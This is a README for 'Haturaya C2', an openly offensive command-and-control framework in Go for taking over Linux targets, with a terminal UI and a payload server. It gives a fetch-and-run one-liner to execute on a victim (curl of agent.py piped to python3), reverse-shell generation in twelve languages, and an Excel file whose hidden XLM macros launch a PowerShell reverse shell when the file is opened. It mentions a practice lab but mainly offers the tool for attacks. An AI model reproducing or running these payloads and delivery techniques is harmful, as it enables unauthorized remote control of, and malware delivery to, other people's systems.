
<h1 align="center">Haturaya C2</h1>

<div align="center">
  <i>ผีสิง — We don't hack systems. We <b>possess</b> them.</i><br><br>
  A Command &amp; Control framework for Linux targets.<br>
  Written entirely in <b>Go</b> — single static binary, no runtime dependencies.
  <img alt="Static Badge" src="https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go&logoColor=white&labelColor=111">
  <img alt="Static Badge" src="https://img.shields.io/badge/Tested--on-Linux-violet?style=for-the-badge&logo=linux&logoColor=black&labelColor=111">
  <img alt="Static Badge" src="https://img.shields.io/badge/AES--256--GCM-Encrypted-green?style=for-the-badge&labelColor=111">
  <p></p>
  <a href="#installation">Install</a>
  <span> • </span>
  <a href="#usage">Usage</a>
  <span> • </span>
  <a href="#payload-generation">Payloads</a>
  <p></p>
</div>

```
╔══════════════════════════════════════════════════════════╗
║  ██╗  ██╗ █████╗ ████████╗██╗   ██╗██████╗  █████╗ ██╗ ██╗  █████╗  ║
║  ██║  ██║██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗ ║
║  ███████║███████║   ██║   ██║   ██║██████╔╝███████║ ╚███╔╝ ███████║ ║
║  ██╔══██║██╔══██║   ██║   ██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██╔══██║ ║
║  ██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║██║  ██║██╔╝ ██╗██║  ██║ ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                   C2 Framework  |  beta  |  Go Edition              ║
╚══════════════════════════════════════════════════════════╝
```

---

## Features

- **Bubble Tea TUI** — full-screen terminal UI with agent sidebar, scrollable output, command input
- **AES-256-GCM encryption** — all agent traffic encrypted with a fresh session key each run
- **Built-in HTTP payload server** — browse and serve payloads at `/`; dynamic endpoints for Excel/VBA
- **Multi-agent support** — manage multiple reverse shells simultaneously with `use <n>` / `kill <n>`
- **Excel reverse shell** — generates `.xlsm` with XLM 4.0 macros (auto-triggers on open)
- **12 payload categories** — bash, sh, python, perl, ruby, php, netcat, socat, openssl, powershell, other, excel
- **Docker lab** — attacker + victim containers with 5 built-in privesc paths for practice

---

## Installation

**Prerequisites**: Go 1.21+

```bash
git clone https://github.com/muhammmadhisam/haturaya
cd haturaya
go build -o haturaya-c2 .
```

Or use the auto-rebuild wrapper (rebuilds when any `.go` file changes):

```bash
chmod +x haturaya.sh
./haturaya.sh 0.0.0.0 9999 9090
```

---

## Usage

```bash
./haturaya-c2 <bind_ip> <c2_port> <web_port>

# Example
./haturaya-c2 0.0.0.0 9999 9090
```

This starts:
- **TCP listener** on `:9999` — accepts agent connections (raw or encrypted)
- **HTTP payload server** on `:9090` — browse at `http://<ip>:9090`

### TUI Controls

| Key | Action |
|-----|--------|
| `↑` / `k` | Move cursor up in agent list |
| `↓` / `j` | Move cursor down in agent list |
| `Enter` | Select agent / send command |
| `Esc` | Background agent, return to console |
| `Ctrl+C` | Quit |

### Console Commands

```
agents                                        list connected agents
use <n>                                       switch to agent n
kill <n>                                      disconnect agent n
generate payloads lhost=X lport=Y shell=Z     show reverse shell payloads
server status                                 show web server URL
help                                          show help
exit                                          quit
```

**Supported shell types**: `bash` `sh` `python` `perl` `ruby` `php` `netcat` `socat` `openssl` `powershell` `other` `excel` `all`

### Agent Commands (inside `use` session)

```
<any shell command>    execute on agent
exit / quit / bg       background agent, return to console
```

---

## Payload Generation

### Quick reverse shells

```bash
# In TUI console
generate payloads lhost=192.168.1.10 lport=9999 shell=all
```

### Encrypted Python agent (AES-256-GCM)

```bash
# Generate agent with embedded session key
generate payloads lhost=192.168.1.10 lport=9999 shell=python

# On victim — fetches and runs agent in one line
curl http://192.168.1.10:9090/payloads/agent.py | python3
```

### Excel reverse shell (.xlsm)

```bash
# Generate Excel payload
generate payloads lhost=192.168.1.10 lport=9999 shell=excel

# Victim downloads from
http://192.168.1.10:9090/payloads/payload.xlsm
```

The `.xlsm` uses Excel 4.0 (XLM) macros hidden in a `veryHidden` sheet.
Opening the file triggers `Auto_Open` → PowerShell reverse shell.

---

## Agent Protocol

### Encrypted mode (Python AES-GCM agent)
- Framing: `[4-byte big-endian length][payload]`
- Payload: `[12-byte nonce][ciphertext]` (AES-256-GCM)
- Handshake: agent sends `HATURAYA_AUTH_v1`, server replies `HATURAYA_OK_v1`

### Raw mode (bash / netcat / socat)
- No framing — direct byte relay
- Server auto-detects raw vs encrypted on first bytes

---

## Architecture

```
./haturaya-c2 0.0.0.0 9999 9090
        │
        ├── goroutine: TCP listener (:9999)
        │     └── goroutine per agent: handler.go
        │
        ├── goroutine: HTTP payload server (:9090)
        │     ├── GET /              — payload browser
        │     ├── GET /payloads/*    — static files
        │     └── GET /payloads/excel.csv|xls|macro.vba  — dynamic
        │
        └── Bubble Tea TUI (main goroutine)
              ├── Agent sidebar
              ├── Scrollable output viewport
              └── Command input
```

---

*Haturaya — ผีสิง. Possess. Control. Vanish.*
